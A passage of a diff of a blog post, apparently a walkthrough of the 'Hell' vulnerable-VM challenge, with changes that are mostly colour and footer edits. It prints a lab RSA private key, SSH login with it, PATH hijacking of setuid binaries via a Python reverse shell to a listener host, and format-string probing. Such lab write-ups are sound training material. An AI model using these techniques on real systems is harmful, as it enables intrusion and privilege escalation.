-drwxr-xr-x <span style="color:#ae81ff">4</span> root   root   4.0K Jul <span style="color:#ae81ff">21</span> 18:50 ..
--rwx------ <span style="color:#ae81ff">1</span> george george 1.7K Jul  <span style="color:#ae81ff">5</span> 20:01 id_rsa
+drwx------ <span style="color:#bd93f9">2</span> george george  16K Jan  <span style="color:#bd93f9">1</span>  <span style="color:#bd93f9">1970</span> .
+drwxr-xr-x <span style="color:#bd93f9">4</span> root   root   4.0K Jul <span style="color:#bd93f9">21</span> 18:50 ..
+-rwx------ <span style="color:#bd93f9">1</span> george george 1.7K Jul  <span style="color:#bd93f9">5</span> 20:01 id_rsa
 george@hell:/media/truecrypt1$ cat id_rsa
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
@@ -965,57 +934,57 @@ YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
 W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
 ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
 rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
-qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM<span style="color:#f92672">=</span>
+qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM<span style="color:#ff79c6">=</span>
 -----END RSA PRIVATE KEY-----
 george@hell:/media/truecrypt1$
 </code></pre></div><p>So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the <code>/etc/passwd</code>. I saved the key to a file on my Kali Linux box and attempted to SSH in as <code>bazza</code>, specifying the private key to use:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
-Linux hell 3.2.0-4-486 <span style="color:#75715e">#1 Debian 3.2.57-3+deb7u2 i686</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
+Linux hell 3.2.0-4-486 <span style="color:#6272a4">#1 Debian 3.2.57-3+deb7u2 i686</span>
 
 The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+the exact distribution terms <span style="color:#ff79c6">for</span> each program are described in the
 individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-Last login: Mon Jul <span style="color:#ae81ff">21</span> 18:52:50 <span style="color:#ae81ff">2014</span> from 192.168.56.1
+Last login: Mon Jul <span style="color:#bd93f9">21</span> 18:52:50 <span style="color:#bd93f9">2014</span> from 192.168.56.1
 $ id
-uid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span>
 $
 </code></pre></div><h2 id="becoming-oj">becoming oj</h2>
 <p><code>bazza</code> had 2 interesting files in hes home directory:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bazza@hell:~$ ls -lh
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bazza@hell:~$ ls -lh
 total 20K
--rw-r--r-- <span style="color:#ae81ff">1</span> root root        <span style="color:#ae81ff">109</span> Jul  <span style="color:#ae81ff">6</span> 18:32 barrebas.txt
--r-xr-sr-x <span style="color:#ae81ff">1</span> oj   developers 6.1K Jul  <span style="color:#ae81ff">6</span> 18:39 part1
--r-sr-xr-x <span style="color:#ae81ff">1</span> oj   oj         5.2K Jul  <span style="color:#ae81ff">6</span> 18:34 part2
+-rw-r--r-- <span style="color:#bd93f9">1</span> root root        <span style="color:#bd93f9">109</span> Jul  <span style="color:#bd93f9">6</span> 18:32 barrebas.txt
+-r-xr-sr-x <span style="color:#bd93f9">1</span> oj   developers 6.1K Jul  <span style="color:#bd93f9">6</span> 18:39 part1
+-r-sr-xr-x <span style="color:#bd93f9">1</span> oj   oj         5.2K Jul  <span style="color:#bd93f9">6</span> 18:34 part2
 </code></pre></div><p>The <code>barrebas.txt</code> looks to be a shoutout to the tester of the vulns. <code>part1</code> &amp; <code>part2</code> from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is <code>oj</code>. Running <code>part1</code> and <code>part2</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bazza@hell:~$ ./part1
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bazza@hell:~$ ./part1
 Checking integrity of part2... Done!!
 
 Checking integrity of calling target... Done!!
 
 Binary and target confirmed.
 
-Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
-uid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>1005<span style="color:#f92672">(</span>oj<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1005<span style="color:#f92672">(</span>oj<span style="color:#f92672">)</span>,1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span>
+Can&#39;t touch this *nah na na na na naaaaaaaa nah*
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">euid</span><span style="color:#ff79c6">=</span>1005<span style="color:#ff79c6">(</span>oj<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">egid</span><span style="color:#ff79c6">=</span>1003<span style="color:#ff79c6">(</span>developers<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1005<span style="color:#ff79c6">(</span>oj<span style="color:#ff79c6">)</span>,1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span>
 
 bazza@hell:~$ ./part2
 
 
-Error! <span style="color:#ae81ff">1004</span> ID detected ... youre not allowed to run this, please use part 1!
+Error! <span style="color:#bd93f9">1004</span> ID detected ... youre not allowed to run this, please use part 1!
 bazza@hell:~$
 </code></pre></div><p>So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. <code>part1</code> outputs what looks like the output of the <code>id</code> command too.</p>
 <p>Again, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.</p>
 <p>We start with a <code>strings</code> of <code>part1</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bazza@hell:~$ strings part1
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bazza@hell:~$ strings part1
 /lib/ld-linux.so.2
 __gmon_start__
 libc.so.6
 _IO_stdin_used
 puts
 popen
-printf
+<span style="color:#8be9fd;font-style:italic">printf</span>
 fgets
 system
 pclose
@@ -1025,21 +994,21 @@ GLIBC_2.1
 GLIBC_2.0
 PTRh
 QVhl
-<span style="color:#f92672">[</span>^_<span style="color:#f92672">]</span>
+<span style="color:#ff79c6">[</span>^_<span style="color:#ff79c6">]</span>
 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
 Checking integrity of part2...
 sha256sum /home/bazza/part2
-Failed to run command
+Failed to run <span style="color:#8be9fd;font-style:italic">command</span>
  Done!!
 Checking integrity of calling target...
 sha256sum /usr/bin/id
-Uh oh.... Corrupted or in wrong directory <span style="color:#f92672">(</span>/home/bazza/<span style="color:#f92672">)</span>
+Uh oh.... Corrupted or in wrong directory <span style="color:#ff79c6">(</span>/home/bazza/<span style="color:#ff79c6">)</span>
  Done!!
 Binary and target confirmed.
 /home/bazza/part2
 Target corrupt
-;*2$<span style="color:#e6db74">&#34;
+;*2$<span style="color:#f1fa8c">&#34;
 </span></code></pre></div><p>This should give you a pretty good idea of what is potentially going on in the binary, like:</p>
 <ul>
 <li>Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1</li>
@@ -1048,84 +1017,81 @@ Target corrupt
 </ul>
 <p>The key lies in the fact that the <code>sha256sum</code> command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the <code>chmod</code> earlier, we are going to do exactly the same with the <code>sha256sum</code>.</p>
 <p>As before, we create a <em>evil sha256sum</em> command, which is actually just a python script to spawn <code>/bin/sh</code>, then prefix <code>PATH</code> with <code>/tmp</code> and run <code>./part1</code>. For this one however, I was having trouble with the pty.spawn() and didn&rsquo;t really feel like troubleshooting that much. So I opted for a (reverse shell)[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet] payload instead to open on a netcat listener that I have on my host laptop:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
-<span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python</span>
+<span style="color:#ff79c6">import</span> socket<span style="color:#ff79c6">,</span>subprocess<span style="color:#ff79c6">,</span>os
 
-s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
-s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;192.168.56.1&#34;</span>,<span style="color:#ae81ff">4444</span>))
+s <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET,socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+s<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#34;192.168.56.1&#34;</span>,<span style="color:#bd93f9">4444</span>))
 
-os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
-os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
-os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">0</span>)
+os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">1</span>)
+os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">2</span>)
 
-p <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>])
+p <span style="color:#ff79c6">=</span> subprocess<span style="color:#ff79c6">.</span>call([<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>,<span style="color:#f1fa8c">&#34;-i&#34;</span>])
 </code></pre></div><p>I spawned a <code>netcat</code> listener on my laptop using <code>nc -l 4444</code>, and ran <code>./part1</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ nc -l <span style="color:#ae81ff">4444</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ nc -l <span style="color:#bd93f9">4444</span>
 $ id
-uid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">egid</span><span style="color:#ff79c6">=</span>1003<span style="color:#ff79c6">(</span>developers<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span>
 </code></pre></div><p>Notice that I was now in the <code>developers</code> group. I was now allowed to run <code>./part2</code> too&hellip; with a verbose line showing me the permissions I would need to gain access to <code>/home/oj</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./part2
-uid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>1005<span style="color:#f92672">(</span>oj<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1005<span style="color:#f92672">(</span>oj<span style="color:#f92672">)</span>,1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./part2
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">euid</span><span style="color:#ff79c6">=</span>1005<span style="color:#ff79c6">(</span>oj<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">egid</span><span style="color:#ff79c6">=</span>1003<span style="color:#ff79c6">(</span>developers<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1005<span style="color:#ff79c6">(</span>oj<span style="color:#ff79c6">)</span>,1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span>
 
-Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
+Can&#39;t touch this *nah na na na na naaaaaaaa nah*
 $
 </code></pre></div><p>And, as expected, I spent some time on this binary too. I didn&rsquo;t expect <code>part2</code> to be any easier :P
 After taking a break, I realized that the output that looks like that of <code>/usr/bin/id</code>, probably <strong>is</strong> that if it. So, off I went and did another <code>sha256sum</code>, type script, this time just with another reverse shell to port 4445, and naming it <code>id</code> so that part2 will pick it up:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ nc -l <span style="color:#ae81ff">4445</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ nc -l <span style="color:#bd93f9">4445</span>
 $ /usr/bin/id
-uid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>1005<span style="color:#f92672">(</span>oj<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>1003<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1005<span style="color:#f92672">(</span>oj<span style="color:#f92672">)</span>,1004<span style="color:#f92672">(</span>bazza<span style="color:#f92672">)</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">euid</span><span style="color:#ff79c6">=</span>1005<span style="color:#ff79c6">(</span>oj<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">egid</span><span style="color:#ff79c6">=</span>1003<span style="color:#ff79c6">(</span>developers<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1005<span style="color:#ff79c6">(</span>oj<span style="color:#ff79c6">)</span>,1004<span style="color:#ff79c6">(</span>bazza<span style="color:#ff79c6">)</span>
 
-$ cd /home/oj
+$ <span style="color:#8be9fd;font-style:italic">cd</span> /home/oj
 $ ls -lh
 total 584K
--r-sr-xr-x <span style="color:#ae81ff">1</span> root root 579K Jul  <span style="color:#ae81ff">5</span> 21:12 echo
--rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">154</span> Jul  <span style="color:#ae81ff">5</span> 21:06 How to be an infosec rockstar 101.txt
+-r-sr-xr-x <span style="color:#bd93f9">1</span> root root 579K Jul  <span style="color:#bd93f9">5</span> 21:12 <span style="color:#8be9fd;font-style:italic">echo</span>
+-rw-r--r-- <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">154</span> Jul  <span style="color:#bd93f9">5</span> 21:06 How to be an infosec rockstar 101.txt
 $
 </code></pre></div><p>And there we are! Group membership for <code>oj</code>, and access to <code>/home/oj</code></p>
 <h2 id="becoming-root">becoming root</h2>
 <p>As with all of the other users, I added myself a ssh key for easy access.</p>
 <p>Now, sadly I have to admit that this is as far as I have been able to come. <code>oj</code> has a binary called <code>echo</code> (not to be confused with the builtin echo), that, as expected, will echo what you input.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">oj@hell:~$ ./echo onetwothree
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">oj@hell:~$ ./echo onetwothree
 onetwothree
 oj@hell:~$
 </code></pre></div><p>I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a <a href="https://www.owasp.org/index.php/Format_string_attack">Format String Attack</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">oj@hell:~$ ./echo %08x.%08x.%08x
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">oj@hell:~$ ./echo %08x.%08x.%08x
 080488c0.bffffcf8.00000000
 oj@hell:~$
 </code></pre></div><p>I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.</p>
 <p><strong>Edit:</strong> One way to root the machine is to make use of the fact that you can run <code>truecrypt</code> as <code>root</code>, and provide a evil container, spawning you a <code>root</code> shell. An example of this can be seen <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">here</a> (and actually references this VM)</p>
 <h2 id="summary">summary</h2>
 <p>Hell sure as heck taught me a lot and was one fun experience! Shoutout to <a href="https://twitter.com/@0x42424242">@0x42424242</a> for the time taken to make this VM available.</p>
+  
   </div>
-  <div id="disqus_thread"></div>
-</div>
+</article>
 
 
-<script type="text/javascript">
-var disqus_shortname = "slashnote";
-(function () {
-    var s = document.createElement('script'); s.async = true;
-    s.type = 'text/javascript';
-    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
-    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
-}());
-</script>
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2020  Leon Jacobs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
 
 
-
-<script type="text/javascript">
-    var disqus_shortname = "slashnote";
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-
-<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
+  </div>
 </body>
-</html>
 
+<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
+<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
+<script src=https://leonjza.github.io/js/main.js></script>
+</html>
